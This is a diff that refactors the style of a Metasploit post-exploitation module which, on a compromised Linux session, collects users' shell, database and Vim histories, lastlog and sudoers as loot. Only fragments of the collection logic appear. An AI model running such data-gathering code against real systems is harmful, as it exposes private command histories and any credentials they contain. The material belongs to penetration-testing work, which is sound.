@@ -1,33 +1,31 @@
 ##
-# This module requires Metasploit: http://metasploit.com/download
+# This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-require 'msf/core'
-require 'rex'
-
-class Metasploit3 < Msf::Post
-
+class MetasploitModule < Msf::Post
   include Msf::Post::File
   include Msf::Post::Linux::System
 
   def initialize(info = {})
-    super(update_info(info,
-      'Name'         => 'Linux Gather User History',
-      'Description'  => %q{
-        This module gathers the following user-specific information:
-        shell history, MySQL history, PostgreSQL history, MongoDB history,
-        Vim history, lastlog, and sudoers.
-      },
-      'License'      => MSF_LICENSE,
-      'Author'       =>
-        [
+    super(
+      update_info(
+        info,
+        'Name' => 'Linux Gather User History',
+        'Description' => %q{
+          This module gathers the following user-specific information:
+          shell history, MySQL history, PostgreSQL history, MongoDB history,
+          Vim history, lastlog, and sudoers.
+        },
+        'License' => MSF_LICENSE,
+        'Author' => [
           # based largely on get_bash_history function by Stephen Haywood
           'ohdae <bindshell[at]live.com>'
         ],
-      'Platform'     => ['linux'],
-      'SessionTypes' => ['shell', 'meterpreter']
-    ))
+        'Platform' => ['linux'],
+        'SessionTypes' => ['shell', 'meterpreter']
+      )
+    )
   end
 
   def run
@@ -42,7 +40,7 @@ class Metasploit3 < Msf::Post
     users = [user] if user != 'root' || users.blank?
 
     vprint_status("Retrieving history for #{users.length} users")
-    shells = %w{ash bash csh ksh sh tcsh zsh}
+    shells = %w[ash bash csh ksh sh tcsh zsh]
     users.each do |u|
       home = get_home_dir(u)
       shells.each do |shell|
@@ -63,18 +61,7 @@ class Metasploit3 < Msf::Post
   def save(msg, data, ctype = 'text/plain')
     ltype = 'linux.enum.users'
     loot = store_loot(ltype, ctype, session, data, nil, msg)
-    print_status("#{msg} stored in #{loot.to_s}")
-  end
-
-  def get_host
-    case session.type
-    when /meterpreter/
-      host = sysinfo['Computer']
-    when /shell/
-      host = session.shell_command_token('hostname').chomp
-    end
-    print_status("Running module against #{host}")
-    host
+    print_good("#{msg} stored in #{loot}")
   end
 
   def execute(cmd)
@@ -130,5 +117,4 @@ class Metasploit3 < Msf::Post
     vim_hist = cat_file("#{home}/.viminfo")
     save("Vim history for #{user}", vim_hist) unless vim_hist.blank? || vim_hist =~ /No such file or directory/
   end
-
 end
